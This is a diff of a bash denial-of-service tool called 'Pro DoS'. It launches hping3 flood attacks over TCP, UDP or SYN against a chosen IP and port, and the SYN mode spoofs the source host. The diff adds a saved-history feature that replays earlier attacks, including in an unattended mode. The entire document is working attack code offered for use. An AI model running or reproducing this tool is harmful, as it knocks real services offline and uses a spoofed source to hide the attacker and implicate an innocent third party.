@@ -1,9 +1,9 @@
 #!/bin/bash
-LAST_IP=`cat ~/.dos_history | grep -w 'Last_IP:' | awk '{printf $2}'`
-LAST_PROTOCOL=`cat ~/.dos_history | grep -w 'Last_Protocol:' | awk '{printf $2}'`
-LAST_PORT=`cat ~/.dos_history | grep -w 'Last_Port:' | awk '{printf $2}'`
-LAST_PAYLOAD_SIZE=`cat ~/.dos_history | grep -w 'Last_Payload_Size:' | awk '{printf $2}'`
-LAST_SPOOF_HOST=`cat ~/.dos_history | grep -w 'Last_Spoof_Host:' | awk '{printf $2}'`
+LAST_IP=`cat ~/.dos_history/last_dos | grep -w 'Last_IP:' | awk '{printf $2}'`
+LAST_PROTOCOL=`cat ~/.dos_history/last_dos | grep -w 'Last_Protocol:' | awk '{printf $2}'`
+LAST_PORT=`cat ~/.dos_history/last_dos | grep -w 'Last_Port:' | awk '{printf $2}'`
+LAST_PAYLOAD_SIZE=`cat ~/.dos_history/last_dos | grep -w 'Last_Payload_Size:' | awk '{printf $2}'`
+LAST_SPOOF_HOST=`cat ~/.dos_history/last_dos | grep -w 'Last_Spoof_Host:' | awk '{printf $2}'`
 UDP=off
 TCP=off
 SYN=off
@@ -23,28 +23,40 @@ elif [ ${SYN} = on ]; then
     PROTOCOL=TCP
     SYN=true
 fi
+BACKTITLE="Pro DoS v0.1337a2"
+function func_history {
+echo "Protocol: ${PROTOCOL}"
+echo "IP: ${LAST_IP}"
+echo "Port: ${LAST_PORT}"
+if [ SYN = true ]; then
+    echo "SYN: Yes"
+    echo "Spoof: ${LAST_SPOOF_HOST}"
+else
+    echo "Payload Size: ${LAST_PAYLOAD_SIZE}"
+fi
+if [ ${PROTOCOL} = TCP ]; then
+    hping3 --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
+elif [ ${PROTOCOL} = UDP ]; then
+    hping3 --udp --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
+elif [ ${PROTOCOL} = SYN ]; then
+    hping3 --flood -I eth0 -S -p ${LAST_PORT} -a ${LAST_SPOOF_HOST} ${LAST_IP}
+fi
+exit 0
+}
 #No GUI, derive parameters from the history.
 if [ "$1" = "Unattended" ] || [ "$1" = "unattended" ]; then
-    echo "Protocol: ${PROTOCOL}"
-    echo "IP: ${LAST_IP}"
-    echo "Port: ${LAST_PORT}"
-    if [ SYN = true ]; then
-        echo "SYN: Yes"
-        echo "Spoof: ${LAST_SPOOF_HOST}"
-    else
-        echo "Payload Size: ${LAST_PAYLOAD_SIZE}"
-    fi
-    if [ ${PROTOCOL} = TCP ]; then
-        hping3 --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
-    elif [ ${PROTOCOL} = UDP ]; then
-        hping3 --udp --flood -I eth0 -p ${LAST_PORT} ${LAST_IP} -d ${LAST_PAYLOAD_SIZE}
-    elif [ ${PROTOCOL} = SYN ]; then
-        hping3 --flood -I eth0 -S -p ${LAST_PORT} -a ${LAST_SPOOF_HOST} ${LAST_IP}
-    fi
-    exit 0
+    func_history
+fi
+if [ "$1" = "History" ] || [ "$1" = "history" ]; then
+    DOS_SESSION=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --fselect ~/.dos_history/ 20 50 --stdout`
+    LAST_IP=`cat ${DOS_SESSION} | grep -w 'Last_IP:' | awk '{printf $2}'`
+    LAST_PROTOCOL=`cat ${DOS_SESSION} | grep -w 'Last_Protocol:' | awk '{printf $2}'`
+    LAST_PORT=`cat ${DOS_SESSION} | grep -w 'Last_Port:' | awk '{printf $2}'`
+    LAST_PAYLOAD_SIZE=`cat ${DOS_SESSION} | grep -w 'Last_Payload_Size:' | awk '{printf $2}'`
+    LAST_SPOOF_HOST=`cat ${DOS_SESSION} | grep -w 'Last_Spoof_Host:' | awk '{printf $2}'`
+    func_history
 fi
 #7:58PM 13/01/2012
-BACKTITLE="Pro DoS v0.1337a2"
 opt=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --radiolist "What method of attack?" 10 30 3 \
 1 TCP ${TCP} \
 2 UDP ${UDP} \
@@ -63,13 +75,11 @@ function main {
     fi
     DATE=`date`
 #No indents here as it didn't work with them.
-cat > ~/.dos_history <<DELIM
-Generated ${DATE}
+echo "Generated ${DATE}
 Last_IP: ${IP}
 Last_Port: ${PORT}
 Last_Protocol: ${opt}
-Last_Payload_Size: ${PAYLOAD_SIZE}
-DELIM
+Last_Payload_Size: ${PAYLOAD_SIZE}" | tee ~/.dos_history/last_dos ~/.dos_history/${IP}.history
 }
 
 function countdown {
@@ -89,7 +99,8 @@ elif [ "${opt}" = "2" ]; then
 elif [ "${opt}" = "3" ]; then
     main
     SPOOF_HOST=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "What host/IP should be spoofed?" 8 40 --stdout`
-    echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history
+    echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.dos_history/${IP}
+    echo "Last_Spoof_Host: ${SPOOF_HOST}" >> ~/.last_dos
     countdown
     hping3 --flood -I eth0 -S -p ${PORT} -a ${SPOOF_HOST} ${IP}
 fi
